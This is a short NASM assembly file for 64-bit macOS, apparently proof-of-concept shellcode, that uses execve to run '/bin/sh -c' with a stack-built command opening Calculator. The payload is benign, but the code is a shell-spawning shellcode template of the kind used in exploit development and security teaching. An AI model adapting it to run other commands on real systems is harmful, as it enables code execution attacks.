; nasm -f macho64 exec_calc.asm
; ld -macosx_version_min 10.14 -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem -o exec_calc exec_calc.o

BITS        64
global      _main

section     .text
_main:
    xor     rax, rax
    mov     al, 0x2         ; rax=0x2
    ror     rax, 0x28       ; 左移 rax=0x2000000
    mov     al, 0x3b        ; rax=execve
    
    xor     rdx, rdx        ; rdx=0

    mov     rdi, '//bin/sh'
    push    rdx
    push    rdi
    push    rsp
    pop     rdi             ; rdi='//bin/sh'

    mov     rbx, '-c'
    push    rdx
    push    rbx
    push    rsp
    pop     rbx             ; rbx='-c'

    ; open /System/Applications/Calculator.app
    ; open /Sy stem/App lication s/Calcul ator.app
    push    rdx
    mov     rcx, 'ator.app'
    push    rcx
    mov     rcx, 's/Calcul'
    push    rcx
    mov     rcx, 'lication'
    push    rcx
    mov     rcx, 'stem/App'
    push    rcx
    mov     rcx, 'open /Sy'
    push    rcx
    push    rsp
    pop     rcx

    push    rdx
    push    rcx
    push    rbx
    push    rdi
    push    rsp
    pop     rsi             ; rsi=['//bin/sh', '-c', 'open /System/Applications/Calculator.app']
    
    syscall                 ; rax=execve rdi='//bin/sh' rsi=['//bin/sh', '-c', 'open /System/Applications/Calculator.app'] rdx=0